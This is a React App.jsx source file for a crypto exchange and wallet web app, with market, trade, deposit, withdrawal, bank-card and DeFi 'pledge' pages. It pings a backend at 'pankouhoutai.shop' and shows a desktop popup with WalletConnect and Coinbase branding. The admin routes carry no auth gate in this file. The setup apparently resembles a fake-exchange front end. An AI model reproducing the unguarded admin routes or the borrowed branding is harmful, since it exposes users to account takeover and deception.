import React, { useEffect, useState } from "react";
import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
import "./i18n";

import AdminSimple from "./pages/AdminSimple";
import Layout from "./Layout";
import AuthGate from "./AuthGate";

import Home from "./pages/Home";
import Market from "./pages/Market";
import CoinDetail from "./pages/CoinDetail";
import Trade from "./pages/Trade";
import Wallet from "./pages/Wallet";

import AssetDetail from "./pages/AssetDetail";
import Deposit from "./pages/Deposit";
import Withdraw from "./pages/Withdraw";
import Deposit1 from "./pages/Deposit1";
import Withdraw1 from "./pages/Withdraw1";
import BuyCrypto1 from "./pages/BuyCrypto1";

import UserCenter from "./pages/UserCenter";
import Mail from "./pages/Mail";
import BankCard from "./pages/BankCard";
import Language from "./pages/Language";
import WithdrawalPassword from "./pages/WithdrawalPassword";
import MSBCertification from "./pages/MSBCertification";
import Introduction from "./pages/Introduction";

import Pledge from "./pages/Pledge";
import DeFiRecord from "./pages/DeFiRecord";

import LoginWallet from "./pages/LoginWallet";
import AdminPanel from "./pages/AdminPanel";

function App() {

  // ⭐ 自动更新用户最后访问时间（last_seen）
  useEffect(() => {
    const token = localStorage.getItem("token");
    if (!token) return;

    const API = import.meta.env.PROD
      ? "https://pankouhoutai.shop"
      : "http://localhost:3001";

    fetch(`${API}/api/ping`, {
      method: "POST",
      headers: { Authorization: `Bearer ${token}` },
    }).catch(() => {});
  }, []);

  // ⭐ 电脑端弹出“下载钱包二维码”
  const [showWalletQr, setShowWalletQr] = useState(false);

  useEffect(() => {
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    if (!isMobile) {
      setShowWalletQr(true); // 电脑才显示
    }
  }, []);

  return (
    <>
      {/* ⭐ 电脑端二维码弹窗 */}
{showWalletQr && (
  <div className="fixed inset-0 bg-[#0b0f1a]/90 z-50 flex items-center justify-center px-4">
    <div className="bg-white pt-6 pb-4 px-6 rounded-3xl shadow-2xl text-center max-w-lg w-full relative">

      {/* 顶部 LOGO */}
      <div className="flex items-center justify-center mb-4">
        <img
          src="/walletconnect-logo.png"
          alt="WalletConnect"
          className="h-6"
        />
      </div>

      {/* 关闭按钮 */}
      <button
        onClick={() => setShowWalletQr(false)}
        className="absolute right-4 top-4 text-gray-400 hover:text-gray-600 text-xl"
      >
        ×
      </button>

      {/* 文案 */}
      <p className="text-gray-600 text-base mb-6">
        Scan the QR code below to download Base Wallet
      </p>

      {/* 大二维码 */}
      <img
        src="/wallet-download.png"
        alt="wallet qr"
        className="w-[320px] h-[320px] mx-auto mb-6"
      />

      {/* 底部提示 */}
      <p className="text-gray-400 text-sm">Copy link: https://www.coinbase.com/wallet/downloads</p>
    </div>
  </div>
)}



      {/* ⭐ 主路由 */}
      <Router>
        <Routes>
          <Route path="/loginwallet" element={<LoginWallet />} />

          <Route
            path="/"
            element={
              <AuthGate>
                <Layout><Home /></Layout>
              </AuthGate>
            }
          />

          <Route
            path="/market"
            element={
              <AuthGate>
                <Layout><Market /></Layout>
              </AuthGate>
            }
          />

          <Route
            path="/coin/:symbol"
            element={
              <AuthGate>
                <Layout><CoinDetail /></Layout>
              </AuthGate>
            }
          />

          <Route
            path="/trade"
            element={
              <AuthGate>
                <Layout><Trade /></Layout>
              </AuthGate>
            }
          />

          <Route
            path="/wallet"
            element={
              <AuthGate>
                <Layout><Wallet /></Layout>
              </AuthGate>
            }
          />

          {/* 其他页面 */}
          <Route path="/asset/:symbol" element={<AuthGate><AssetDetail /></AuthGate>} />
          <Route path="/wallet/:symbol/deposit" element={<AuthGate><Deposit /></AuthGate>} />
          <Route path="/wallet/:symbol/withdraw" element={<AuthGate><Withdraw /></AuthGate>} />

          <Route path="/deposit1" element={<AuthGate><Deposit1 /></AuthGate>} />
          <Route path="/withdraw1" element={<AuthGate><Withdraw1 /></AuthGate>} />
          <Route path="/buycrypto1" element={<AuthGate><BuyCrypto1 /></AuthGate>} />

          <Route path="/user" element={<AuthGate><UserCenter /></AuthGate>} />
          <Route path="/user/mail" element={<AuthGate><Mail /></AuthGate>} />
          <Route path="/user/bank" element={<AuthGate><BankCard /></AuthGate>} />
          <Route path="/user/language" element={<AuthGate><Language /></AuthGate>} />
          <Route path="/user/withdrawal-password" element={<AuthGate><WithdrawalPassword /></AuthGate>} />
          <Route path="/intro" element={<AuthGate><Introduction /></AuthGate>} />
          <Route path="/user/msb" element={<AuthGate><MSBCertification /></AuthGate>} />

          <Route path="/defi" element={<AuthGate><Pledge /></AuthGate>} />
          <Route path="/defi-record" element={<AuthGate><DeFiRecord /></AuthGate>} />

          <Route path="/admin" element={<AdminPanel />} />
          <Route path="/admin2" element={<AdminSimple />} />

          {/* 没匹配默认首页 */}
          <Route path="*" element={<Home />} />
        </Routes>
      </Router>
    </>
  );
}

export default App;
